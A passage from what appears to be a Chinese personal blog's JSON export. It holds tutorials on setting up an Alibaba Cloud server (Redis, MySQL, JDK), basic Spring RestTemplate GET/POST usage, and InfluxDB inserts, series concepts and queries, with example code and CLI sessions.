xxx# 修改端口号port 6110# 后台启动daemonize yes# 外网访问,注释bindprotected-mode yesbind 127.0.0.1 3. 注意 阿里云服务器，redis的外网访问，同样需要设置安全组 请不要使用默认端口号，记得一定设置密码 III. mysql1. 下载安装1234567891011wget http://repo.mysql.com/mysql57-community-release-el7-8.noarch.rpmrpm -ivh mysql57-community-release-el7-8.noarch.rpmyum -y install mysql-server # 启动service mysqld restart# 查询密码grep \"password\" /var/log/mysqld.log# 修改密码alter user 'root'@'localhost' identified by 'SubscribeXhhBlog!'flush privileges ## 刷新权限 2. 添加用户12alter user 'root'@'localhost' identified by 'SubscribeXhhBlog!';create user 'xhh'@'%' IDENTIFIED BY 'SubscribeXhhBlog!!'; 授予权限 123# root 方式登录grant all PRIVILEGES on xhh.* to 'xhh'@'%' IDENTIFIED by 'SubscribeXhhBlog!';flush privileges; IV. java环境1. 安装12345678## 到官网找到对应的版本，获取下载地址wget http://download.oracle.com/otn-pub/java/jdk/8u171-b11/512cd62ec5174c3487ac17c61aaa89e8/jdk-8u171-linux-x64.tar.gz?AuthParam=1529400028_058a3f3fdf9c78aa6502a6e91edfb1d2## 解压tar -zxvf jdk-8u171-linux-x64.tar.gz?AuthParam=1529400028_058a3f3fdf9c78aa6502a6e91edfb1d2## 目录指定mv jdk-8u171-linux-x64 /usr/local/java/ 2. 配置进入配置文件 : vi /etc/profile 12345## 文件末尾添加export JAVA_HOME=/usr/local/java/jdk1.8.0_171export JRE_HOME=${JAVA_HOME}/jreexport CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/libexport PATH=${JAVA_HOME}/bin:$PATH 应用 source /etc/profile 测试 java | javac V. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/06/22/阿里云服务器基本环境配置/"},{"title":"180813-Spring之RestTemplate使用小结一","text":"Spring之RestTemplate初级使用篇作为一个Java后端，需要通过HTTP请求其他的网络资源可以说是一个比较常见的case了；一般怎么做呢？ 可能大部分的小伙伴直接捞起Apache的HttpClient开始做，或者用其他的一些知名的开源库如OkHttp, 当然原生的HttpURLConnection也是没问题的 本篇博文则主要关注点放在Spring的生态下，利用RestTemplate来发起Http请求的使用姿势 I. RestTempalate 基本使用0. 目标在介绍如何使用RestTemplate之前，我们先抛出一些小目标，至少需要知道通过RestTemplate可以做些什么，以及我们要用它来干些什么 简单的给出了一下常见的问题如下 普通的Get请求获取返回数据，怎么玩？ post提交表达的请求，如何处理 post请求中RequestBody的请求方式与普通的请求方式区别 https/http两种访问如何分别处理 如何在请求中带上指定的Header 有跨域的问题么？如果有怎么解决 有登录验证的请求，该怎么办，怎样携带身份信息 上传文件可以支持么 对于需要代理才能访问的http资源，加代理的姿势是怎样的 上面的问题比较多，目测不是一篇博文可以弄完的，因此对这个拆解一下，本篇主要关注在RestTemplate的简单Get/Post请求的使用方式上 1. 基本接口捞出源码，看一下其给出的一些常用接口，基本上可以分为下面几种 1234567891011121314151617181920212223242526// get 请求public &lt;T&gt; T getForObject();public &lt;T&gt; ResponseEntity&lt;T&gt; getForEntity();// head 请求public HttpHeaders headForHeaders();// post 请求public URI postForLocation();public &lt;T&gt; T postForObject();public &lt;T&gt; ResponseEntity&lt;T&gt; postForEntity();// put 请求public void put();// pathch public &lt;T&gt; T patchForObject// deletepublic void delete()// optionspublic Set&lt;HttpMethod&gt; optionsForAllow// exchangepublic &lt;T&gt; ResponseEntity&lt;T&gt; exchange() 上面提供的几个接口，基本上就是Http提供的几种访问方式的对应，其中exchange却又不一样，后面细说 2. Get请求从上面的接口命名上，可以看出可以使用的有两种方式 getForObject 和 getForEntity，那么这两种有什么区别？ 从接口的签名上，可以看出一个是直接返回预期的对象，一个则是将对象包装到 ResponseEntity 封装类中 如果只关心返回结果，那么直接用 GetForObject 即可 如果除了返回的实体内容之外，还需要获取返回的header等信息，则可以使用 getForEntity a. 创建Get接口为了验证RestTemplate的使用姿势，当然得先提供一个后端的REST服务，这了直接用了我个人的一个古诗词的后端接口，来作为简单的Get测试使用 请求连接： https://story.hhui.top/detail?id=666106231640 返回结果: 123456789101112131415{ \"status\": { \"code\": 200, \"msg\": \"SUCCESS\" }, \"result\": { \"id\": 666106231640, \"title\": \"西塞山二首（今谓之道士矶，即兴国军大冶县\", \"author\": \"王周\", \"content\": \"西塞名山立翠屏，浓岚横入半江青。\\n千寻铁锁无由问，石壁空存道者形。\\n匹妇顽然莫问因，匹夫何去望千春。\\n翻思岵屺传诗什，举世曾无化石人。\", \"explain\": \"\", \"theme\": \"无\", \"dynasty\": \"唐诗\" }} b. getForObject方式首先看下完整的接口签名 12345678@Nullablepublic &lt;T&gt; T getForObject(String url, Class&lt;T&gt; responseType, Object... uriVariables) throws RestClientException ;@Nullablepublic &lt;T&gt; T getForObject(String url, Class&lt;T&gt; responseType, Map&lt;String, ?&gt; uriVariables) throws RestClientException ;@Nullablepublic &lt;T&gt; T getForObject(URI url, Class&lt;T&gt; responseType) throws RestClientException; 有三个重载的方法，从接口上也比较容易看出如何使用，其中有点疑惑的则是第一个，参数应该怎么传了，下面给出上面几种的使用姿势 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657public class RestTestmplateTest { private RestTemplate restTemplate; @Before public void init() { restTemplate = new RestTemplate(); } @lombok.Data static class InnerRes { private Status status; private Data result; } @lombok.Data static class Status { int code; String msg; } @lombok.Data static class Data { long id; String theme; String title; String dynasty; String explain; String content; String author; } @Test public void testGet() { // 使用方法一，不带参数 String url = \"https://story.hhui.top/detail?id=666106231640\"; InnerRes res = restTemplate.getForObject(url, InnerRes.class); System.out.println(res); // 使用方法一，传参替换 url = \"https://story.hhui.top/detail?id={?}\"; res = restTemplate.getForObject(url, InnerRes.class, \"666106231640\"); System.out.println(res); // 使用方法二，map传参 url = \"https://story.hhui.top/detail?id={id}\"; Map&lt;String, Object&gt; params = new HashMap&lt;&gt;(); params.put(\"id\", 666106231640L); res = restTemplate.getForObject(url, InnerRes.class, params); System.out.println(res); // 使用方法三，URI访问 URI uri = URI.create(\"https://story.hhui.top/detail?id=666106231640\"); res = restTemplate.getForObject(uri, InnerRes.class); System.out.println(res); }} 看上面的testcase，后面两个方法的使用没什么好说的，主要看一下org.springframework.web.client.RestTemplate#getForObject(java.lang.String, java.lang.Class&lt;T&gt;, java.lang.Object...) 的使用姿势 根据实际传参替换url模板中的内容 使用方法一时，模板中使用 {?} 来代表坑位，根据实际的传参顺序来填充 使用方法二时，模板中使用 {xx}, 而这个xx，对应的就是map中的key 上面执行后的截图如下 c. getForEntity方式既然getForObject有三种使用方法，那么getForEntity理论上也应该有对应的三种方式 123public &lt;T&gt; ResponseEntity&lt;T&gt; getForEntity(String url, Class&lt;T&gt; responseType, Object... uriVariables) throws RestClientException ;public &lt;T&gt; ResponseEntity&lt;T&gt; getForEntity(String url, Class&lt;T&gt; responseType, Map&lt;String, ?&gt; uriVariables) throws RestClientException;public &lt;T&gt; ResponseEntity&lt;T&gt; getForEntity(URI url, Class&lt;T&gt; responseType) throws RestClientException; 因为使用姿势和上面一致，因此只拿一个进行测试 123456@Testpublic void testGetForEntity() { String url = \"https://story.hhui.top/detail?id=666106231640\"; ResponseEntity&lt;InnerRes&gt; res = restTemplate.getForEntity(url, InnerRes.class); System.out.println(res);} 对这个，我们主要关注的就是ResponseEntity封装中，多了哪些东西，截图如下 从上面可以看出，多了两个东西 一个返回的http状态码，如200表示请求成功，500服务器错误，404not found等 一个 ResponseHeader 3. Post请求从上面的接口说明上看，post请求除了有forObject 和 forEntity之外，还多了个forLocation；其次post与get一个明显的区别就是传参的姿势问题，get的参数一般会待在url上；post的则更常见的是通过表单的方式提交 因此接下来关注的重点在于forLocation是什么，以及如何传参 a. post接口mock首先创建一个简单的提供POST请求的REST服务，基于Spring-boot简单搭建一个，如下 12345678910@ResponseBody@RequestMapping(path = \"post\", method = {RequestMethod.GET, RequestMethod.OPTIONS, RequestMethod.POST})public String post(HttpServletRequest request, @RequestParam(value = \"email\", required = false) String email, @RequestParam(value = \"nick\", required = false) String nick) { Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(\"code\", \"200\"); map.put(\"result\", \"add \" + email + \" # \" + nick + \" success!\"); return JSON.toJSONString(map);} b. postForObject方法首先看一下接口签名 12345public &lt;T&gt; T postForObject(String url, @Nullable Object request, Class&lt;T&gt; responseType, Object... uriVariables) throws RestClientException ;public &lt;T&gt; T postForObject(String url, @Nullable Object request, Class&lt;T&gt; responseType, Map&lt;String, ?&gt; uriVariables) throws RestClientException;public &lt;T&gt; T postForObject(URI url, @Nullable Object request, Class&lt;T&gt; responseType) throws RestClientException ; 上面的三个方法，看起来和前面并没有太大的区别，只是多了一个request参数，那么具体的使用如何呢？ 下面分别给出使用用例 1234567891011121314151617181920212223242526272829303132@Testpublic void testPost() { String url = \"http://localhost:8080/post\"; String email = \"test@hhui.top\"; String nick = \"一灰灰Blog\"; MultiValueMap&lt;String, String&gt; request = new LinkedMultiValueMap&lt;&gt;(); request.add(\"email\", email); request.add(\"nick\", nick); // 使用方法三 URI uri = URI.create(url); String ans = restTemplate.postForObject(uri, request, String.class); System.out.println(ans); // 使用方法一 ans = restTemplate.postForObject(url, request, String.class); System.out.println(ans); // 使用方法一，但是结合表单参数和uri参数的方式，其中uri参数的填充和get请求一致 request.clear(); request.add(\"email\", email); ans = restTemplate.postForObject(url + \"?nick={?}\", request, String.class, nick); System.out.println(ans); // 使用方法二 Map&lt;String, String&gt; params = new HashMap&lt;&gt;(); params.put(\"nick\", nick); ans = restTemplate.postForObject(url + \"?nick={nick}\", request, String.class, params); System.out.println(ans);} 上面分别给出了三种方法的调用方式，其中post传参区分为两种，一个是uri参数即拼接在url中的，还有一个就是表单参数 uri参数，使用姿势和get请求中一样，填充uri中模板坑位 表单参数，由MultiValueMap封装，同样是kv结构 c. postForEntity和前面的使用姿势一样，无非是多了一层包装而已，略过不讲 d. postForLocation这个与前面有点区别，从接口定义上来说，主要是 POST 数据到一个URL，返回新创建资源的URL 同样提供了三个接口，分别如下，需要注意的是返回结果，为URI对象,即网络资源 1234567public URI postForLocation(String url, @Nullable Object request, Object... uriVariables) throws RestClientException ;public URI postForLocation(String url, @Nullable Object request, Map&lt;String, ?&gt; uriVariables) throws RestClientException ;public URI postForLocation(URI url, @Nullable Object request) throws RestClientException ; 那么什么样的接口适合用这种访问姿势呢？ 想一下我们一般登录or注册都是post请求，而这些操作完成之后呢？大部分都是跳转到别的页面去了，这种场景下，就可以使用 postForLocation 了，提交数据，并获取返回的URI，一个测试如下 首先mock一个后端接口 1234567891011@ResponseBody@RequestMapping(path = \"success\")public String loginSuccess(String email, String nick) { return \"welcome \" + nick;}@RequestMapping(path = \"post\", method = {RequestMethod.GET, RequestMethod.OPTIONS, RequestMethod.POST})public String post(HttpServletRequest request, @RequestParam(value = \"email\", required = false) String email, @RequestParam(value = \"nick\", required = false) String nick) { return \"redirect:/success?email=\" + email + \"&amp;nick=\" + nick + \"&amp;status=success\";} 访问的测试用例，基本上和前面的一样，没有什么特别值得一说的 1234567891011121314@Testpublic void testPostLocation() { String url = \"http://localhost:8080/post\"; String email = \"test@hhui.top\"; String nick = \"一灰灰Blog\"; MultiValueMap&lt;String, String&gt; request = new LinkedMultiValueMap&lt;&gt;(); request.add(\"email\", email); request.add(\"nick\", nick); // 使用方法三 URI uri = restTemplate.postForLocation(url, request); System.out.println(uri);} 执行结果如下 获取到的就是302跳转后端url，细心的朋友可能看到上面中文乱码的问题，如何解决呢？ 一个简单的解决方案就是url编码一下 123456@RequestMapping(path = \"post\", method = {RequestMethod.GET, RequestMethod.OPTIONS, RequestMethod.POST}, produces = \"charset/utf8\")public String post(HttpServletRequest request, @RequestParam(value = \"email\", required = false) String email, @RequestParam(value = \"nick\", required = false) String nick) throws UnsupportedEncodingException { return \"redirect:/success?email=\" + email + \"&amp;nick=\" + URLEncoder.encode(nick, \"UTF-8\") + \"&amp;status=success\";} II. 小结上面目前只给出了Get/Post两种请求方式的基本使用方式，并没有涉及到更高级的如添加请求头，添加证书，设置代理等，高级的使用篇等待下一篇出炉，下面小结一下上面的使用姿势 1. Get请求get请求中，参数一般都是带在url上，对于参数的填充，有两种方式，思路一致都是根据实际的参数来填充url中的占位符的内容；根据返回结果，也有两种方式，一个是只关心返回对象，另一个则包含了返回headers信心 参数填充 形如 http://story.hhui.top?id={0} 的 url 调用 getForObject(String url, Class&lt;T&gt; responseType, Object... uriVariables) 模板中的0，表示 uriVariables 数组中的第0个， i，则表示第i个 如果没有url参数，也推荐用这个方法，不传uriVariables即可 形如 http://story.hhui.top?id={id} 的 url 调用 getForObject(String url, Class&lt;T&gt; responseType, Map&lt;String, ?&gt; uriVariables) map参数中的key，就是url参数中 {} 中的内容 其实还有一种传参方式，就是path参数，填充方式和上面一样，并没有什么特殊的玩法，上面没有特别列出 返回结果 直接获取返回的数据 getForObject 获取待responseHeader的数据 getForEntity 2. Post请求 post请求的返回也有两种，和上面一样 post请求，参数可以区分为表单提交和url参数，其中url参数和前面的逻辑一致 post表单参数，请包装在 MultiValueMap 中，作为第二个参数 Request 来提交 post的方法，还有一个 postForLocation，返回的是一个URI对象，即适用于返回网络资源的请求方式 3. 其他最前面提了多点关于网络请求的常见case，但是上面的介绍，明显只处于基础篇，我们还需要关注的有 如何设置请求头？ 有身份验证的请求，如何携带身份信息？ 代理的设置 文件上传可以怎么做？ post提交json串（即RequestBody) 又可以怎么处理 上面可能还停留在应用篇，对于源码和实现有兴趣的话，问题也就来了 RestTemplaet的实现原理是怎样的 前面url参数的填充逻辑实现是否优雅 返回的对象如何解析 …. 小小的一个工具类，其实东西还挺多的，接下来的小目标，就是针对上面提出的点，逐一进行研究 III. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/08/13/180813-Spring之RestTemplate使用小结一/"},{"title":"190726-Influx Sql系列教程五：insert 添加数据","text":"接下来开始进入influxdb的curd篇，首先我们看一下如何添加数据，也就是insert的使用姿势 在进入本篇之前，对于不了解什么是retention policy, tag, field的同学，有必要快速过一下这几个基本概念，可以参考文后的系列教程 I. Insert 使用说明基本语法 1insert into &lt;retention policy&gt; measurement,tagKey=tagValue fieldKey=fieldValue timestamp 1. 基本写数据姿势当measurement不存在的时候，我们插入一条数据时，就会创建这个measurement a. 基本case下面给出一个简单的实例 insert add_test,name=YiHui,phone=110 user_id=20,email=&quot;bangzewu@126.com&quot; 新增一条数据，measurement为add_test, tag为name,phone, field为user_id,email 1234567891011121314151617181920212223242526272829&gt; show measurementsname: measurementsname----yhh&gt; insert add_test,name=YiHui,phone=110 user_id=20,email=\"bangzewu@126.com\"&gt; show measurements;name: measurementsname----add_testyhh&gt; select * from add_testname: add_testtime email name phone user_id---- ----- ---- ----- -------1564149327925320596 bangzewu@126.com YiHui 110 20&gt; show tag keys from add_test;name: add_testtagKey------namephone&gt; show field keys from add_test;name: add_testfieldKey fieldType-------- ---------email stringuser_id float 从上面的输出，简单小结一下插入的语句写法 insert + measurement + &quot;,&quot; + tag=value,tag=value + + field=value,field=value tag与tag之间用逗号分隔；field与field之间用逗号分隔 tag与field之间用空格分隔 tag都是string类型，不需要引号将value包裹 field如果是string类型，需要加引号 b. field类型我们知道field有四种类型，int, float, string, boolean，下面看一下插入数据时，四种类型如何处理 123456789&gt; insert add_test,name=YiHui,phone=110 user_id=21,email=\"bangzewu@126.com\",age=18i,boy=true&gt; show field keys from add_testname: add_testfieldKey fieldType-------- ---------age integerboy booleanemail stringuser_id float 小结一下四种类型的指定方式 类型 方式 示例 float 数字 user_id=21 int 数字i age=18i boolean true/false boy=true String &quot;&quot; or '' email=”bangzewu@126.com“ c. 时间戳指定当写入数据不指定时间时，会自动用当前时间来补齐，如果需要自己指定时间时，再最后面添加上即可，注意时间为ns 12345678&gt; insert add_test,name=YiHui,phone=110 user_id=22,email=\"bangzewu@126.com\",age=18i,boy=true 1564150279123000000&gt; select * from add_test;name: add_testtime age boy email name phone user_id---- --- --- ----- ---- ----- -------1564149327925320596 bangzewu@126.com YiHui 110 201564149920283253824 18 true bangzewu@126.com YiHui 110 211564150279123000000 18 true bangzewu@126.com YiHui 110 22 2. 指定保存策略插入数据前面写入数据没有指定保存策略，表示这条数据写入到默认的保存策略中；我们知道一个数据库可以有多个保存策略，一个measurement中也可以存不同的保存策略的数据，在写入数据时，如果需要指定保存策略，可以使用 insert into 保存策略 ... 12345678910111213141516171819&gt; show retention policies on testname duration shardGroupDuration replicaN default---- -------- ------------------ -------- -------autogen 0s 168h0m0s 1 true1_d 24h0m0s 1h0m0s 1 false1_h 1h0m0s 1h0m0s 1 false&gt; insert into \"1_d\" add_test,name=YiHui2,phone=911 user_id=23,email=\"bangzewu@126.com\",age=18i,boy=true 1564150279123000000&gt; select * from add_test;name: add_testtime age boy email name phone user_id---- --- --- ----- ---- ----- -------1564149327925320596 bangzewu@126.com YiHui 110 201564149920283253824 18 true bangzewu@126.com YiHui 110 211564150279123000000 18 true bangzewu@126.com YiHui 110 22&gt; select * from \"1_d\".add_test;name: add_testtime age boy email name phone user_id---- --- --- ----- ---- ----- -------1564150279123000000 18 true bangzewu@126.com YiHui2 911 23 II. 其他0. 系列博文 190723-Influx Sql系列教程四：series/point/tag/field 190721-Influx Sql系列教程三：measurement 表 190719-Influx Sql系列教程二：retention policy 保存策略 190718-Influx Sql系列教程一：database 数据库 190717-Influx Sql系列教程零：安装及influx-cli使用姿势介绍 190509-InfluxDb之时间戳显示为日期格式 190506-InfluxDB之配置修改 190505-InfluxDB之权限管理 180727-时序数据库InfluxDB之备份和恢复策略 180726-InfluxDB基本概念小结 180725-InfluxDB-v1.6.0安装和简单使用小结 参考博文 https://docs.influxdata.com/influxdb/v1.7/concepts/glossary https://docs.influxdata.com/influxdb/v1.7/query_language/schema_exploration https://docs.influxdata.com/influxdb/v1.7/tools/shell/#write-data-to-influxdb-with-insert 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/07/26/190726-Influx-Sql系列教程五：insert-添加数据/"},{"title":"190723-Influx Sql系列教程四：series/point/tag/field","text":"influxdb中的一条记录point，主要可以分为三类，必须存在的time（时间），string类型的tag，以及其他成员field；而series则是一个measurement中保存策略和tag集构成；本篇教程将介绍一些这几个概念 1. taginfluxdb数据结构中记录元数据（metadata）的kv对，不要求必须存在，tag key/value 都是字符串类型，而且会建立索引，因此基于tag进行查询效率比单纯的基于field进行查询是要高的；后续的一些sql也会发现，某些查询只能基于tag 重点提炼 tag key/value: 字符串类型 有索引 常见的查询tag的语法如下 1show tag keys on &lt;database&gt; from &lt;measurement&gt; 下面给出一个实际的例子, insert语句后面会说到，我们塞入的一条数据，指定name为tag，另外三个为field 1234567891011&gt; insert yhh,name=一灰灰 age=26,id=10,blog=\"http://blog.hhui.top\"&gt; select * from yhhname: yhhtime age blog id name---- --- ---- -- ----1563888301725811554 26 http://blog.hhui.top 10 一灰灰&gt; show tag keys from yhhname: yhhtagKey------name 上面是获取tag keys的查询方式，下面介绍下查询tag values的使用姿势 1show tag values on &lt;database&gt; from &lt;measurement&gt; with KEY [ [&lt;operator&gt; \"&lt;tag_key&gt;\" | &lt;regular_expression&gt;] | [IN (\"&lt;tag_key1&gt;\",\"&lt;tag_key2\")]] [WHERE &lt;tag_key&gt; &lt;operator&gt; ['&lt;tag_value&gt;' | &lt;regular_expression&gt;]] [LIMIT_clause] [OFFSET_clause] with key 后面带上查询条件，必须存在，如查询汇率表中，base_symbol有哪些 连接符号可以为：等于 =, 不等于：!=, &lt;&gt;, 正则：=~, !~ 123456789101112131415161718192021222324&gt; show tag values from currency_rate with key=\"base\"name: currency_ratekey value--- -----base AUDbase CADbase CNYbase DKKbase EURbase GBPbase HKDbase IDRbase INRbase JPYbase KRWbase NZDbase PHPbase PLNbase RUBbase SGDbase THBbase TRYbase UAHbase USD 2. field成员，也可以理解为一条记录中，不需要建立索引的数据，一般来说，不太会有参与查询语句建设的可以设置为field 区别与tag，field有下面几个特性 类型可以为：浮点，字符串，整形 没有索引 查看field key的语句如下 1show field keys on &lt;database&gt; from &lt;measurement&gt; 下面演示一下查看的姿势 1234567&gt; show field keys from yhhname: yhhfieldKey fieldType-------- ---------age floatblog stringid float 3. point https://docs.influxdata.com/influxdb/v1.7/concepts/glossary/#point 在influxdb中，你可以将一条mysql中的记录简单的理解为一个point，它由四个组件 measurement tag set field set timestamp 每个point是根据 timestamp + series 来保证唯一性。 关于point可以怎么理解呢？因为influxdb是时序数据库，简单来讲就是每个数据都是时间轴上的一个点，这些数据与时间强相关，其中的tag用来检索，field用来记录一些信息，measurement用来将相同类型的数据归集 4. series https://docs.influxdata.com/influxdb/v1.7/concepts/glossary/#series 上面说到point的唯一性时，说到了series，这个概念又是啥呢？ 官方的说明是: The collection of data in the InfluxDB data structure that share a measurement, tag set, and retention policy. influxdb中measurement + tags set + retention policy 组成的数据集合 直接看定义可能有点懵逼，官方提供查看series的命令如下 1show series on &lt;database&gt; from &lt;measurement&gt; 下面是几个实例辅助说明 12345678910111213&gt; insert yhh,name=一灰灰 age=26,id=10,blog=\"http://blog.hhui.top\"&gt; insert yhh,name=一灰灰 age=30,id=11,blog=\"http://blog.hhui.top\"&gt; select * from yhh;name: yhhtime age blog id name---- --- ---- -- ----1563889538654374538 26 http://blog.hhui.top 10 一灰灰1563889547738266214 30 http://blog.hhui.top 11 一灰灰&gt; show series on test from yhhkey---yhh,name=一灰灰&gt; 我们插入两个point到yhh这个measurement中，但是他们的tag相同都是一灰灰，此时我们查看series时，发现只有一条yhh,name=一灰灰，包含measurement和tag set 接下来我们试一下，新增一个tag，series是否会增加呢？ 12345678910111213141516&gt; insert yhh,name=一灰灰2 age=30,id=11,blog=\"http://blog.hhui.top\"&gt; insert yhh,name=一灰灰3,phone=110 age=30,id=11,blog=\"http://blog.hhui.top\"&gt; select * from yhhname: yhhtime age blog id name phone---- --- ---- -- ---- -----1563889538654374538 26 http://blog.hhui.top 10 一灰灰1563889547738266214 30 http://blog.hhui.top 11 一灰灰1563889704754695002 30 http://blog.hhui.top 11 一灰灰21563889723440000821 30 http://blog.hhui.top 11 一灰灰3 110&gt; show series on test from yhhkey---yhh,name=一灰灰yhh,name=一灰灰2yhh,name=一灰灰3,phone=110 官方定义中series还与保存策略有关，前面两个case都是默认的保存测录，我们现在在新的保存策略中测试 12345678910111213141516171819202122&gt; create retention policy \"1D\" on test duration 1d replication 1&gt; insert into \"1D\" yhh,name=一灰灰4 age=26,id=10,blog=\"http://blog.hhui.top\"&gt; select * from yhh;name: yhhtime age blog id name phone---- --- ---- -- ---- -----1563889538654374538 26 http://blog.hhui.top 10 一灰灰1563889547738266214 30 http://blog.hhui.top 11 一灰灰1563889704754695002 30 http://blog.hhui.top 11 一灰灰21563889723440000821 30 http://blog.hhui.top 11 一灰灰3 110&gt; select * from \"1D\".yhhname: yhhtime age blog id name phone---- --- ---- -- ---- -----1563890614849474879 26 http://blog.hhui.top 10 一灰灰4&gt; show serieskey---yhh,name=一灰灰yhh,name=一灰灰2yhh,name=一灰灰3,phone=110yhh,name=一灰灰4 插入到”1D”保存策略中的point也构成了一个series: yhh,name=一灰灰4 注意 show series预计中还支持基于tag的where查询，下面是一个简单的示例 12345678show series from yhh where \"name\" = '一灰灰'key---yhh,name=一灰灰&gt; show series from yhh where phone != ''key---yhh,name=一灰灰3,phone=110 II. 其他0. 系列博文 190721-Influx Sql系列教程三：measurement 表 190719-Influx Sql系列教程二：retention policy 保存策略 190718-Influx Sql系列教程一：database 数据库 190717-Influx Sql系列教程零：安装及influx-cli使用姿势介绍 190509-InfluxDb之时间戳显示为日期格式 190506-InfluxDB之配置修改 190505-InfluxDB之权限管理 180727-时序数据库InfluxDB之备份和恢复策略 180726-InfluxDB基本概念小结 180725-InfluxDB-v1.6.0安装和简单使用小结 参考博文 https://docs.influxdata.com/influxdb/v1.7/concepts/glossary https://docs.influxdata.com/influxdb/v1.7/query_language/schema_exploration 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/07/23/190723-Influx-Sql系列教程四：series-point-tag-field/"},{"title":"190813-Influx Sql系列教程八：query数据查询基本篇","text":"前面几篇介绍了InfluxDB的添加，删除修改数据，接下来进入查询篇，掌握一定的SQL知识对于理解本篇博文有更好的帮助，下面在介绍查询的基础操作的同时，也会给出InfluxSql与SQL之间的一些差别 在开始之前，先看一下供查询的数据 12345678910111213141516171819&gt; show measurementsname: measurementsname----yhh&gt; select * from yhhname: yhhtime age blog id name phone---- --- ---- -- ---- -----1563889538654374538 26 http://blog.hhui.top 10 一灰灰1563889547738266214 30 http://blog.hhui.top 11 一灰灰1563889704754695002 30 http://blog.hhui.top 11 一灰灰21563889723440000821 30 http://blog.hhui.top 11 一灰灰3 110&gt; show tag keys from yhhname: yhhtagKey------namephone 1. 基本查询基本查询语法如下 1SELECT &lt;field_key&gt;[,&lt;field_key&gt;,&lt;tag_key&gt;] FROM &lt;measurement_name&gt;[,&lt;measurement_name&gt;] 上面的语法中，划分了select和from两块 select语句 select * : 表示查询所有的field和tag对应的值 select field_key: 表示查询特定的field对应的值 select tag_key: 表示查询的特定的tag对应的值 SELECT &quot;&lt;field_key&gt;&quot;::field,&quot;&lt;tag_key&gt;&quot;::tag: 注意::field和::tag用来限定这个数据的类型为tag或者是field from语句 from后面需要接上measurement，表示从这个mesaurement中查询数据 FROM &lt;measurement_name&gt; 从指定的measurement中获取数据 FROM &lt;measurement_name&gt;,&lt;measurement_name&gt; 从多个measurement中获取数据 FROM &lt;database_name&gt;.&lt;retention_policy_name&gt;.&lt;measurement_name&gt; 从某个数据库中某个保留策略中查询measurement中的数据 实例演示 下面给出几个简答的演示实例，分别介绍查询指定的field/tag的方式 12345678910111213141516&gt; select age from yhh;name: yhhtime age---- ---1563889538654374538 261563889547738266214 301563889704754695002 301563889723440000821 30&gt; select \"age\"::field, \"name\"::tag from yhh;name: yhhtime age name---- --- ----1563889538654374538 26 一灰灰1563889547738266214 30 一灰灰1563889704754695002 30 一灰灰21563889723440000821 30 一灰灰3 2. 保留策略数据查询上面的定义中，说明了可以查询指定保留策略中的数据，下面演示一下应该如何实现 1234567891011# 创建保留策略&gt; create retention policy \"1D\" duration 1d on test# 插入一条数据&gt; insert into \"1D\" yhh,name=二灰,phone=119 email=\"bangzewu@126.com\",blog=\"http://spring.hhui.top\",id=27# 查询&gt; select * from \"1D\".yhhname: yhhtime blog email id name phone---- ---- ----- -- ---- -----1565693045801509796 http://spring.hhui.top bangzewu@126.com 27 二灰 119&gt; 查询语句和一般的select没有什么特别的区别，唯一需要注意的是measurement前面需要加上保留策略 3. Where语句前面的查询主要是限定需要获取的数据，而我们实际的场景中，更多的是查询某类满足条件的数据，也就是常见的SQL中加上where查询条件限定 语法如下 1SELECT_clause FROM_clause WHERE &lt;conditional_expression&gt; [(AND|OR) &lt;conditional_expression&gt; [...]] 主要看一下where后面的条件表达式，因为influxdb中的数据可以划分为两类，这两种不同的类型，在构建查询语句的时候，会有一些区别 field查询条件 我们已知field的类型有四种：string|int|boolean|float，所以它支持的操作符有 操作符 说明 = 相等 &lt;&gt;, != 不相同 &gt;, &gt;= 大于,大于等于 &lt;, &lt;= 小于,小于等于 tag查询条件 在influxdb中tag都是string类型，会建立索引，所以基于tag的查询效率一般来讲是优于field查询的，它支持的操作符为 操作符 说明 = 相等 &lt;&gt;, != 不相同 在influxdb中没有in查询，不同的查询条件可以使用and/or来连接，表示同时满足or一个满足即可，下满给出几个简单的实例 1234567891011121314151617181920212223242526# 根据field进行查询&gt; select * from yhh where age=26name: yhhtime age blog id name phone---- --- ---- -- ---- -----1563889538654374538 26 http://blog.hhui.top 10 一灰灰# 根据tag进行查询&gt; select * from yhh where phone!=''name: yhhtime age blog id name phone---- --- ---- -- ---- -----1563889723440000821 30 http://blog.hhui.top 11 一灰灰3 110# 简单的运算查询&gt; select * from yhh where age + 2&gt;30name: yhhtime age blog id name phone---- --- ---- -- ---- -----1563889547738266214 30 http://blog.hhui.top 11 一灰灰1563889704754695002 30 http://blog.hhui.top 11 一灰灰21563889723440000821 30 http://blog.hhui.top 11 一灰灰3 110&gt; select * from yhh where \"name\"='一灰灰'name: yhhtime age blog id name phone---- --- ---- -- ---- -----1563889538654374538 26 http://blog.hhui.top 10 一灰灰1563889547738266214 30 http://blog.hhui.top 11 一灰灰 4. 